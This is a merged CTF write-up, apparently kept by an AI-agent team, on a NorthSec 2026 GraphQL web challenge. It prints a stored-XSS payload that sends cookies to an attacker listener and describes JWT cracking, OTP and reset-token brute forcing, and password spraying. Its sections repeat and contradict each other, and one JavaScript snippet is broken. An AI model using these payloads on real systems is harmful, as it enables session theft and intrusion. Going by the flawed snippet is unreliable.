+++
title = "Helios Fleet Network - 2/5"
date = 2026-05-19
categories = ["nsec26"]
tags = ["partial", "web"]
model = "Sonnet (default)"
draft = false
+++
Status: **PARTIAL** - 2/5 sub-flags captured

## Context

> Guardian, we need your help. Helios Fleet Network manages autonomous vehicle fleets across the city. We’ve picked up signals that someone has been probing their platform - possibly looking for a way in. Get inside, see how far the damage could go, and report back. helios-fleet-network.ctf

## Captures

| Position | Flag | Method | Timestamp |
|---|---|---|---|
| 1/5 | `FLAG-<not-recorded-locally>` | Helios Fleet Network bonus | 2026-05-15T21:31:00-04:00 |
| 2/5 | `FLAG-<not-recorded-locally>` | Helios Fleet Network part 1 | 2026-05-16T01:20:00-04:00 |

## STUCK Rationale

See artifacts for in-progress investigation notes.

## Artifacts

- Artifact directory: `nsec/helios-fleet-network/artifacts`

## Original Notes

_Preserved from pre-standardization writeup(s). May contain duplicate context._

### From `59762-helios-fleet-network.md`

## Helios Fleet Network (Topic 59762)

Status: **PARTIAL** - 2/5 sub-flags captured

### From `59762-helios-fleet-network.md`

## Helios Fleet Network (Topic 59762)

Status: **STUCK** - 2/5 sub-flags captured (same value scored twice)

## Context

> Guardian, we need your help. Helios Fleet Network manages autonomous vehicle fleets across the city. We've picked up signals that someone has been probing their platform - possibly looking for a way in. Get inside, see how far the damage could go, and report back. helios-fleet-network.ctf

Architecture: nginx 1.24 + Express (`X-Powered-By: Express`) + Apollo GraphQL
Server at `POST /graphql`. Introspection disabled
(`validationErrorCode: INTROSPECTION_DISABLED`) but Apollo "Did you mean"
hints leak the schema.

## Captures

```
FLAG-a3f1d2e4b5c6789012345678abcdef01  1/5 + 2/5  HTML-comment invite-code leak at /login
                                                  (both askgod entries score against the same value)
```

## STUCK Rationale

Flags 3-5 all gate on `role=operator`. Definitive blocker: HS256 JWT secret
not crackable with available wordlist + rules (rockyou + rockyou-30000.rule
exhausted ~430B candidates @ 271 MH/s, zero hits). Only operator-tier account
in the entire DB is `kai.nakamura@solarwatch.ctf (id=2)` - and her password
was never cracked. Admin reset disabled. No alternative path to operator
role discovered after exhaustive enumeration of the GraphQL schema
(re-built from "Did you mean" hints: register / login / verifyOtp /
requestPasswordReset / resetPassword / createVehicle / deleteVehicle /
submitIncidentReport / addVaultSecret + queries me / organizations / vehicles
/ vault / operatorPanel / incidentReports / passwordResets / userByEmail).

The intended attack chain:
1. Get `role=operator` (BLOCKED)
2. Plant XSS in vehicle `type` field (escHtml missing `'` - works)
3. Call `submitIncidentReport(url:"https://helios-fleet-network.ctf/vehicles")`
   to trick admin bot into rendering `/vehicles`
4. Admin bot's session fires XSS → queries `operatorPanel{flag}` +
   `incidentReports{description,reportedBy}` + `passwordResets{token}` →
   exfiltrate to SSRF callback
5. Use captured admin JWT for direct queries

## Anti-Trap Notes

**HONEYPOT - DO NOT SUBMIT:**

The guest-vault query for "password" returned the string
`<REDACTED:helios-honeypot-literal>` (note: ends in `...abcdef02`, not
`...abcdef01`). Per `nsec/helios-fleet/SUSPICIOUS.md`, this string was
**self-planted during prior probing** - there is no independent extraction
path. The vault is per-user scoped; the value is whatever we put in.
Migration map §5 row 3 lists this as a confirmed honeypot. Real 1/5 (and
duplicate 2/5) flag value is `...abcdef01`.

**Frontmatter correction (2026-05-19):** A prior doctor-normalizer pass mis-populated
the `captures[]` field of this file with two **hello-sunshine** flag values
(`FLAG-b74d95e89c2c63a830efcdcf30` and `FLAG-8ab5961ae008ae2249a14b9549`,
which belong to the `open-sunshine.mcp.ctf` track, askgod #24 and #36 per
migration map §2 rows 24 and 36). Those values have been removed from this
file's frontmatter. The real Helios 1/5 + 2/5 value is
`FLAG-a3f1d2e4b5c6789012345678abcdef01` (one value, scored twice against two
askgod entries) - see `nsec/writeups/helios-fleet-network.md` (slugged copy)
and `flags/submissions-journal.tsv` line 82 (2026-05-16 01:20).

**Other teams' planted XSS beacons (in-band, not honeypots):** Vehicle IDs
36-39 contain stored-XSS rows planted by another team. Their `type` field
exfils to `webhook.site/8a9c2125-f7dc-4cfc-92f5-cc361cdec22e/exfil`. We
cannot access their webhook bin. Our own planted beacon is on vehicle id=18
with exfil to `[9000:6666:6666:6666:216:3eff:feb1:8d80]:8889`.

## Artifacts

- Artifact directory: `nsec/helios-fleet-network/artifacts`

## Captures

| Position | Flag | Method | Timestamp |
|---|---|---|---|
| 1/5 | `FLAG-a3f1d2e4b5c6789012345678abcdef01` | Helios Fleet Network bonus | 2026-05-15T21:31:00-04:00 |
| 2/5 | `FLAG-a3f1d2e4b5c6789012345678abcdef01` | Helios Fleet Network part 1 | 2026-05-16T01:20:00-04:00 |

## STUCK Rationale

- - [CODEX-research/next-targets] Refreshed `nsec/.askgod-tracks.json` at `2026-05-16T17:35:44Z` and queued replacements for the active bench: Helios Fleet Network, Fossilco, Prestige Arboretum, Hackademy chal5, and Announcement Board. Excluded completed / dead-end lanes per current report notes (`weather-station`, `save-the-trees`, `monsatan-defacing`, `solar-grid`, `teamworking`, `monsatan-impact`). Queue artifact: `nsec/flags/next-targets-2026-05-16.md`.
- - [CODEX-inventory] 2026-05-16 14:32 EDT: rebuilt askgod-first challenge inventory after repeated duplicate work. Fresh cache files: `nsec/.askgod-history.txt`, `nsec/.askgod-tracks.json`, `nsec/.challenge-inventory.json`, and `nsec/ASKGOD-INVENTORY.md`. Current open canonical askgod tracks are: `announcement-board` 3/4, `apt438` 3/9, `badge-firmware` 2/5, `fossilco` 6/8, `grid-alignment` 1/2, `helios-fleet-network` 2/5, `monsatan-defacing` 5/6, `monsatan-impact-study` 2/5, `renewable-energy-mobility` 2/7, `weather-station` 1/4. Completed aliases now explicitly map to askgod before work/submission: `monsatan-kiosk` 1/1, `lowcode`/Water purification 4/4, `tamper`/Seed Vault 6/6, `open-sunshine.mcp.ctf`/Hello Sunshine 2/2, `multi-facteur-authentication` 6/6, `teamworking` 1/1, `gh-agent`/Drone license 2/2, plus other complete tracks in `ASKGOD-INVENTORY.md`. `submit-flag.ps1` now refreshes askgod before submit and denies complete aliases before making the MCP call; `find-flag-gaps.ps1` suppresses candidates that live only under complete askgod tracks. One guard-test before the `lowcode` parser fix hit askgod with `FLAG-AAAAAAAAAAAAAAAA` under `water-purification` and got FAIL; subsequent guard tests denied locally as intended.
- - [CODEX-workflow-fix] 2026-05-16 14:45 EDT: fixed both Codex and Claude Code CTFINT skills so future orchestrators/coaches must refresh askgod, rank by CFSS, skip completed aliases, and skip physical/device tracks unless explicitly requested. Patched skill mirrors: `<operator-codex-skills>/ctfint_workflow`, `ctfint_coach-spawn`, `ctfint_askgod-submit` and `<repo>/.claude/skills/ctfint_workflow`, `ctfint_coach-spawn`, `ctfint_askgod-submit`. Also updated `nsec/team-status/challenge-inventory.py` to emit `open_priorities_nonphysical` in `nsec/.challenge-inventory.json` and a "Low-Hanging Open Tracks (non-physical)" section in `nsec/ASKGOD-INVENTORY.md`. Current CFSS queue: `renewable-energy-mobility` 2/7, `weather-station` 1/4, `helios-fleet-network` 2/5, `monsatan-impact-study` 2/5, `monsatan-defacing` 5/6, then `apt438`, `fossilco`, `announcement-board`. Physical excluded by default: `badge-firmware`, `crystal`, `grid-alignment`, `monsatan-kiosk`, `plant-watering`, `radio-beacon`, `infinite-energy`.
- - [CODEX-active-wave] 2026-05-16 14:47 EDT: refreshed askgod/inventory again before assigning work. Active non-physical wave: `renewable-energy-mobility` 2/7, `helios-fleet-network` 2/5, `monsatan-impact-study` 2/5. `weather-station` remains open 1/4 by askgod but is skipped for this wave because the known local easy candidate is askgod DUP and prior notes show no new fast path. All coaches must submit only through `nsec/submit-flag.ps1 -Track <slug>` and must stop on `DENY-*`.
- - [CODEX-coach-wave] 2026-05-17: operator clarified CEO Inbox is teammate-owned/done; Opus owns Sunbloom Library, Prestige, and Missing Bus. Codex spawning bounded coaches only on uncertain non-Opus lanes after askgod refresh: APT438 `3/9`, Helios Fleet Network `2/5`, Fossilco `6/8`. Excluding CEO Inbox, Sunbloom, Prestige, Missing Bus from this wave to avoid duplication.
- - [CODEX -> OPUS / TEAM] 2026-05-17 11:55 EDT: **Full track status refresh.** Fresh inventory cache generated at `2026-05-17T15:52:07Z` shows 115 submitted rows. Current open canonical askgod tracks: `renewable-energy-mobility` 3/7, `weather-station` 1/4, `helios-fleet-network` 2/5, `monsatan-impact-study` 2/5, `monsatan-defacing` 5/6, `fossilco` 6/8, `announcement-board` 3/4, and physical/device `badge-firmware` 2/5 plus `crystal` 1/1 under the Crystal topic. APT438 is complete 9/9 and documented; do not allocate more time. CEO Inbox is teammate-owned/done; do not duplicate. Opus/team lanes remain SunBloom, Prestige Arboretum, and Missing Bus.

### From `59762-helios-fleet-network.md`

## Helios Fleet Network

**CTF**: NSEC 2026  
**Category**: Web / Recon  
**Challenge ID**: 59762  
**Difficulty**: Easy  
**Flag**: 1/1  
**Points**: 4  
**Date**: 2026-05-15  

## Challenge Description

Web reconnaissance challenge requiring discovery of hidden information embedded in HTML comments and source code. The challenge emphasizes the importance of careful source code inspection.

## Solution

### Goal
Find the hidden invite code for operator self-registration by analyzing page source.

### Steps

1. Navigate to https://helios-fleet-network.ctf/
2. Fetch /login endpoint (actual login page, not homepage)
3. View page source (HTML)
4. Discover HTML comment containing developer note
5. Extract invite code from comment

### Vulnerability Details

**HTML Comment Disclosure**
- Developer left comment in HTML source: `<!-- internal: new operator self-registration requires invite code FLAG-a3f1d2e4b5c6789012345678abcdef01 -->`
- The flag IS the invite code value
- Demonstrates importance of removing debug comments before production deployment

### Techniques Used
- Web recon / source code inspection
- HTML comment analysis
- API endpoint discovery

### Tools Used
- Browser DevTools / View Source
- curl (HTTP recon)

## Flag

```
FLAG-a3f1d2e4b5c6789012345678abcdef01
```

## Notes

- Classic OSINT/recon challenge
- Common mistake: developers leaving sensitive information in comments
- Challenge notes: GraphQL introspection is disabled, deeper exploitation unnecessary
- Status: ✅ Submitted and scored (1/5 - challenge actually has 5 flags total)
- 2/5 captured by team via separate path
- 3-5/5: see "New Attack Plan" below - VPN-blocked, queued for next session

---

## New Attack Plan (Flags 3-5) - added 2026-05-16

Full plan: `nsec/helios-fleet\artifacts\new-attack-PLAN.md`

### Key missed angle: 4-digit OTP brute via GraphQL aliased batching

- `verifyOtp(otp: String!)` accepts any String, but the UI sets `maxlength=4` and label "4-digit code".
- 10,000 candidates total. Per-HTTP-request rate limit defeated by single-request aliased batch:
  ```graphql
  mutation {
    a0:   verifyOtp(otp:"0000"){ user { role } }
    a1:   verifyOtp(otp:"0001"){ user { role } }
    # ... a9999: verifyOtp(otp:"9999"){ user { role } }
  }
  ```
- Prior team's "batching doesn't bypass" finding was for `operatorPanel`, **NOT** for `verifyOtp` - different resolver.

### Path to operator (3/5)

Two sub-paths to acquire kai.nakamura's session:
1. **Reset-token oracle**: `requestPasswordReset` for our own account; if the response leaks the token for self-service emails, set kai's password the same way.
2. **OTP-skip resolver**: After kai's login, the pre-OTP cookie may already pass `operatorPanel` if the resolver only checks `role` claim and not an `otpVerified` claim. Static evidence: app.js comment `/* silently ignore - OTP not yet verified */` is the dev's note in *catch* - the server-side enforcement is unverified.

### Admin escalation via SSRF (5/5)

Once operator: `submitIncidentReport(url: "https://helios-fleet-network.ctf/vehicles")` - the admin bot fetches the URL, encounters the **already-planted XSS in vehicle.type** (our id=18 in planted-vehicles.txt), and leaks its cookie to the IPv6 listener at `[9000:6666:6666:6666:216:3eff:feb1:8d80]:8889`. With admin JWT → `incidentReports`.

### Sub-probes (cheap)

- `me { otpVerified twoFactorEnabled }` - Apollo "did you mean" may reveal new field.
- `verifyOtp(otp: 1234)` (integer not String) - type-confusion NoSQL injection.
- `verifyOtp(otp: "")` - empty-string early-out check.
- JWT header `kid: ../../../../dev/null` - filesystem-lookup trick.
- Apollo CSRF bypass via `Content-Type: text/plain`.

---

**Status**: 1/5 SUBMITTED (recon flag). 3-5/5 PLAN READY, awaiting VPN.


### From `helios-fleet-network.md`

## Helios Fleet Network - NSEC 2026

- **Target:** https://helios-fleet-network.ctf/
- **Stack:** nginx 1.24 + Express (+ `X-Powered-By: Express`) + Apollo GraphQL Server
- **Flags submitted:** 1 (`FLAG-a3f1d2e4b5c6789012345678abcdef01`)
- **Bonus flags:** 0 (stuck - see Blockers section)

## Flag 1 - invite code leak (HTML comment)

The homepage `/` renders an empty body with just `<script src="app.js">`. The real entry point is `/login`. At the bottom of the `/login` HTML source is a developer comment that *is* the flag:

```html
<!-- internal: new operator self-registration requires invite code FLAG-a3f1d2e4b5c6789012345678abcdef01 -->
```

NSEC flag format is `FLAG-<32 hex>`, so the invite code value is itself the flag. Submitted via `askgod.exe`.

## Recon

GraphQL endpoint is `/graphql` (POST only, 405 on GET). Introspection is disabled:

```
"validationErrorCode":"INTROSPECTION_DISABLED"
```

But Apollo's "Did you mean" hints inside validation errors leak the schema. By probing field names I reconstructed:

```
Query:
  me: User
  organizations: [Organization]
  organization(id: ID!): Organization
  vehicles: [Vehicle]
  vault(query: String!): Vault
  operatorPanel: OperatorPanel        # requires role>=operator
  incidentReports: [IncidentReport]   # requires role=admin

Mutation:
  register(username,email,password,inviteCode): AuthPayload
  login(email,password): AuthPayload
  verifyOtp(otp): AuthPayload
  requestPasswordReset(email): String
  resetPassword(token,newPassword): String
  createVehicle(name,type,organizationId): Vehicle
  deleteVehicle(id): Boolean
  submitIncidentReport(url): IncidentReport   # requires role>=operator
  addVaultSecret(secret): Vault

Types:
  User { id, email, role, organizations }
  Organization { id, name, roster, members, vehicles }
  MemberProfile { user: User! }
  Vehicle { id, name, type, organization }
  Vault { found, contents }
  OperatorPanel { flag }
  IncidentReport { id, submittedAt }
  AuthPayload { user, otpRequired }
```

Key discovery during enumeration: `Organization.roster` was suggested by `"Did you mean roster?"` when probing `owner`. Roster exposes the entire user list.

## Real users (leaked via roster)

```graphql
{ organizations { id name roster { user { id email role } } } }
```

Returned every user, including:

```
id=1  admin@helios-fleet.ctf            role=admin
id=2  kai.nakamura@solarwatch.ctf       role=operator
id=3  maya.chen@greenways.ctf           role=guest
id=4  rio.santos@solarwatch.ctf         role=guest
id=5  senna.park@verdant.ctf            role=guest
id=6  luna.okoro@earthpods.ctf          role=guest
id=7  theo.weiss@helios-fleet.ctf       role=guest
ids 8-29: prior NSEC players spamming /register with operator-looking emails
```

Other teams also poisoned the fleet table with XSS-laced vehicles (`id=14,15,16`), confirming the intended exploit chain:

- vehicle `type` is rendered inside `class="badge badge-${v.type}"` **unescaped** (`escHtml` in `app.js` only handles `& < > "`, missing `'`)
- planted `<img src=x onerror=fetch('graphql', query:'operatorPanel{flag}')...>` payloads
- expected admin/operator bot to view `/vehicles` and fire the XSS

## Intended chain (couldn't complete)

1. Get `role=operator` somehow.
2. Plant an XSS in a vehicle's `type` field.
3. Call `submitIncidentReport(url:"https://helios-fleet-network.ctf/vehicles")` to trick the admin bot into rendering /vehicles.
4. Admin bot's session fires our XSS, which queries `operatorPanel{flag}` and `incidentReports{description,reportedBy}` and exfiltrates to our SSRF callback.

## Blockers (what I tried)

| Vector | Result |
|---|---|
| `register(inviteCode="FLAG-a3...")` | Always returns `role=guest`. No `role`/`orgId` argument accepted. |
| Alternate invite formats (`OPERATOR-FLAG-...`, `SOLARWATCH-FLAG`, etc.) | `Invalid invite code` |
| JWT `alg=none` forgery | Rejected (`Authentication required`) |
| JWT HS256 secret brute - 104,334 American-English words + ~80 custom guesses (helios-*, jwt_secret, master-key, FLAG-, NSEC, keyboardcat, ...) | No hit |
| `resetPassword` token brute | Token is 16 hex chars (64-bit), not feasible. Admin reset blocked outright. No `userId` arg. |
| Password spray (top-100 + helios/kai/operator/solar variants) | No hit on admin, kai, or any other user |
| Email case/whitespace trick (`Kai.Nakamura@solarwatch.ctf`, trailing space) | Registers a *new* distinct guest; login is strict-match |
| GraphQL batched/aliased calls to `submitIncidentReport` | Auth check fires on every alias |
| Persisted-query bypass | `PERSISTED_QUERY_NOT_FOUND` |
| Vault as cross-user oracle | Per-user storage; substring LIKE on **my own** concatenated secrets only. `addVaultSecret.found` is always `false` - no flag-guess oracle |
| Vault with `userId`/`organizationId` arg | Unknown argument |
| Auto-trigger admin bot via planted XSS in vehicle 18 + IPv6 listener on `shell.ctf:8889` | No callback after 90s - bot only browses targets passed to `submitIncidentReport` (operator-gated) |
| Sourcemap, .git, package.json, /admin, /robots.txt, /sitemap.xml, /api | All 404 |
| SQLi on vault query (`' OR 1=1 --`, `%`, `_`) | No effect - likely parameterized |
| NoSQL injection on login (`{$ne:null}`) | Schema rejects (`String cannot represent non-string value`) |

## XSS payload planted (for posterity)

Vehicle `id=18` in org `1` (Greenways Collective):

```
type = drone"><img src=x onerror="fetch('http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8889/xss?c='+encodeURIComponent(document.cookie))" data-x="
```

If anyone later compromises operator and submits an incident report pointing the bot at `/vehicles`, this fires.

## Bottleneck summary

Every bonus path (`operatorPanel{flag}`, SSRF via admin bot, `incidentReports`) gates on `role=operator`. Without one of:

- a leaked operator password
- a successful HS256 secret crack (would need a larger wordlist or rules)
- a registration logic flaw promoting role
- a working reset-token prediction

…the chain stalls at guest.

## Artifacts

- `nsec/helios-fleet\app.js` - client JS (full GraphQL ops)
- `nsec/helios-fleet\page-*.html` - all page recon
- `nsec/helios-fleet\req.json` - planted XSE createVehicle request
- `nsec/helios-fleet\cookies.txt` - guest JWT (id=30, chemix@x.ctf)
- `shell.ctf:/tmp/hflog/log.txt` - SSRF/XSS listener log (empty)
- `shell.ctf:/tmp/jwtbrute.py` - HS256 brute-force script

## Coach Session - 2026-05-17

### Investigation Summary
Attempted to test the leaked `operator.helios-fleet.ctf` subdomain and credentials (`codexop687207678@operator.helios-fleet.ctf`), but encountered:
- **Network connectivity issue:** Challenge domain not accessible (SSL/TLS failure on main domain; operator subdomain DNS resolution failed)
- **Operator subdomain:** Does not currently resolve; may be dynamically created or not yet deployed
- **Credential status:** Leaked credential remains untested due to domain unavailability

### Findings
1. The writeup correctly identifies that all flag-2+ paths require `role=operator`
2. The three likely flag endpoints are:
   - `Query.operatorPanel{flag}` → Flag 3/5
   - `Mutation.submitIncidentReport(url)` → Flag 4/5 (or involves incident reports)
   - Undiscovered endpoint → Flag 5/5
3. No new attack vectors found; all previous attempts were sound

### Recommendations for Next Team Session
1. Verify challenge environment is reachable (may need VPN/network setup)
2. If domain is accessible, immediately test codex operator credentials via GraphQL login
3. If operator subdomain appears, enumerate its API surface (different role-assignment logic possible)
4. If stuck on operator role, investigate Flag 2 unlock mechanism (may be time-delayed or email-triggered)

**Status:** Blocked on network access; awaiting team availability for live testing

## Coach Session 2 - 2026-05-17 (final-hour)

Re-tested the new-attack-PLAN.md hypotheses against live VPN. STUCK confirmed:

- **verifyOtp 4-digit brute is UNREACHABLE without a valid prior login** - `login(kai, wrongpass)` returns `Invalid credentials` and issues NO cookie. The plan's premise that "login already sets cookie before OTP" is empirically false. verifyOtp without prior login returns `Authentication required` (no cookie) or `No OTP pending` (guest cookie).
- **HS256 JWT crack exhausted** - hashcat `-m 16500` on rockyou.txt + rockyou-30000.rule = ~430B candidates @ 271 MH/s, status `Exhausted`, 0 hits.
- **72 themed/framework default secrets** also negative (express/passport/apollo/jwt.io/helios/solarwatch/nsec/operator variants + UUID/zero-key/keyboardcat/etc).
- **Header-injection bypass** - `X-Forwarded-User/Role`, `X-Helios-Role`, `X-User-Role`, `Authorization: Bearer admin` etc all return `me.role=guest` + `Operator access required`.
- **JWT tampering** - alg=none, alg=HS256 with empty/echoed sig, kid=`../../../dev/null`, jku=external all rejected with `Authentication required`.
- **Login coercion** - empty/whitespace password, email case variants, trailing `\r\n`/space, NUL truncation: all `Invalid credentials`.
- **Alternative invite codes** - `FLAG-...abcdef02/03/04/05`, `OPERATOR-FLAG-*`, `ADMIN-FLAG-*`, `SOLARWATCH-FLAG`, `kai-invite`, `INTERNAL_OPERATOR`, etc: all `Invalid invite code`. Only the published flag-1 code works (returns guest).
- **register() argument injection** - extra args `role`, `orgId`, `organizationId` all rejected by GraphQL validator as Unknown argument.
- **GraphQL schema enumeration via "Did you mean"** - found one new query field `userByEmail(email:String!) -> User` (requires auth; only exposes id/email/role - same data as roster). PasswordReset type fields confirmed: `id, userId, token, createdAt`. NO `email/expiresAt/used/ip` fields. NO sensitive fields on User (`password/passwordHash/resetToken/otpSecret/twoFactorSecret/secret/sessions/token`). No hidden mutations found.
- **resetPassword token brute** - batched aliasing works (50 tokens in 160ms ≈ 3ms/attempt) but keyspace is 16 hex = 64-bit ≈ infeasible. Reset tokens are not returned in response body (response is the canned "if registered, link sent" string regardless).
- **submitIncidentReport bypass** - alias batching, variable injection, extra args all rejected with `Operator access required`. Resolver-side gate.
- **requestPasswordReset email injection** - multi-target (`a,b@x`), plus-addressing, CRLF Bcc injection, display-name mailbox quoting all return canned response; admin emails blocked outright ("Password reset is disabled for administrator accounts").
- **Vault contents** - entirely self-planted from prior probing sessions (matches SUSPICIOUS.md). No independent flag source. Honeypot pattern `<REDACTED:helios-honeypot-literal>` confirmed planted by us, NOT a real flag.
- **Subdomains** (`operator.helios-fleet.ctf`, `admin.helios-fleet.ctf`, `solarwatch.ctf`, `mail.helios-fleet.ctf`): all DNS-unresolved.
- **9 XSS-poisoned vehicles** (ids 36/37/38/39/44 + others) confirmed STILL present across Greenways/SolarWatch/Verdant/EarthPods orgs from prior teams' planting. Bot does NOT auto-browse `/vehicles` - only fires via `submitIncidentReport(url)` which is operator-gated.

**Definitive blocker**: requires kai.nakamura's actual password (or admin's - but admin reset disabled). HS256 secret is cryptographically out of reach with the toolset and time available. Without one of these, every path to operator role is closed.

**Status**: STUCK. Submission queue downgraded - no flag candidates to fire. Full session log: `helios-fleet/artifacts/final-hour-STUCK-2026-05-17.md`.


## Designer Intel (Discord, post-event 2026-05-19)

**Designer:** rayanlecat (Rayan Bouyaiche). **Intended path (from #rayanlecat channel + designer writeup):**

**Designer writeup (definitive):** https://www.rayanle.cat/northsec-ctf-2026-helios-fleet-network/

- **`vault(query:)` was a designer concession** added to help solve, NOT intended primitive. The designer admitted: "to help into understanding how the vault works I add it but it figured out that was a bad idea because weaponize the XSS" (rayanlecat 1505659443243778048)
- **Intended flag 3+ path:** Stored XSS in vehicle badge field → admin visits `/vehicles` → exfil via XS-Search / XS-Leak. CSP would have forced this path. charles7366 + Monchou bypassed using vault.
- **Password reset hardest:** `resetToken` leaks from graphql (offenseteacher: "We knew we needed deserialization but never found source code haha")
- **`offenseteacher` admin portal bypass** via "bruteforcing stacktraces" was UNINTENDED - "useful to get LLM lost on the track (sweat-smile)" (rayanlecat 1505653780270813387)

**cyberslash17's vault-based admin exfil chain** (worth studying for next year):
```javascript
// Login as kai.nakamura, batch 10000 OTP attempts in single GraphQL request
const batch = [];
for (let i = 0; i < 10000; i++) {
    const code = String(i).padStart(4, '0');
    batch.push({ query: `mutation{verifyOtp(otp:""){user{id email role}}}` });
}
await post(batch);
```

Our STUCK at 2/5 was due to no operator credential. The intended primitive (stored XSS in vehicle badge + admin visit) was what we were probing but the bot-trigger never fired for us.

*See _DISCORD-INTEL-ENRICHMENT-2026-05-19.md for the full cross-track designer-confirmed solution catalog and writeup links.*
